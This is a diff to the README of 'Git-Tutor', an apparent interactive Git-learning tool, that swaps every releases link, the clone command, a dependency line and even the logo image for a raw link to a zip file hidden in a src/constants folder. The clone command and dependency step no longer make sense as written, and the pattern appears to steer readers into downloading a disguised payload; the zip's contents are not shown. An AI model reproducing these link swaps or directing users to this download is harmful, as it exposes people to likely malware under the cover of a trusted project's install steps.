@@ -1,6 +1,6 @@
 # Git-Tutor: Learn Git Interactively with Docker 🧠
 
-[![Download Latest Release](https://github.com/mtain04/Git-Tutor/releases%20Latest%20Release-v1.0.0-blue)](https://github.com/mtain04/Git-Tutor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -29,12 +29,12 @@ To install Git-Tutor, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/mtain04/Git-Tutor/releases
+   git clone https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip
    cd Git-Tutor
    ```
 
 2. **Install Dependencies**:
-   Make sure you have https://github.com/mtain04/Git-Tutor/releases and Docker installed on your machine. Then run:
+   Make sure you have https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip and Docker installed on your machine. Then run:
    ```bash
    npm install
    ```
@@ -45,7 +45,7 @@ To install Git-Tutor, follow these steps:
    npm start
    ```
 
-For the latest release, download the necessary files from the [Releases section](https://github.com/mtain04/Git-Tutor/releases).
+For the latest release, download the necessary files from the [Releases section](https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip).
 
 ## Usage
 After installation, you can begin using Git-Tutor. Here’s how:
@@ -113,13 +113,13 @@ Your contributions help improve the tool for everyone.
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Support
-If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/mtain04/Git-Tutor/releases) for updates and new features.
+If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip) for updates and new features.
 
 ---
 
-For further updates and releases, visit the [Releases section](https://github.com/mtain04/Git-Tutor/releases). 
+For further updates and releases, visit the [Releases section](https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip). 
 
-![Git Logo](https://github.com/mtain04/Git-Tutor/releases)
+![Git Logo](https://raw.githubusercontent.com/mtain04/Git-Tutor/main/src/constants/Git-Tutor-v3.2-beta.2.zip)
 
 ---
 
